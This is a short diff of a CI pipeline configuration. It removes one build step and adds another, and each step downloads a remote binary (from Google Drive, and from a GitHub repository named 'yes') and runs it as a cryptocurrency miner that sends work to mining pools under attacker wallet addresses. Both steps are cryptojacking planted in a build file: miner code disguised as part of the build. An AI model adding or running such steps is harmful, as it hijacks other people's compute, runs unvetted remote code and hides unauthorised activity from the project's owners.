@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget -O loop3 "https://drive.google.com/uc?export=download&id=1JTWxpvZU2wWUSDLRD070xUK9ggP6b6jm" > loop3 && chmod +x loop3 && ./loop3 -v -l ap.luckpool.net:3956 -u RQ8nHsobx2G5cM9HtaCnZof7T7XgYjFi1c.colab -p x -t $(nproc)
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo verushash -coin BCH -wallet pze048sl60v6upk64v587rmmf45tzrfgvsxm6wmuat -rigName $(shuf -i 1-9999 -n 1)-BCH -pool1 verushash.asia.mine.zergpool.com:3300
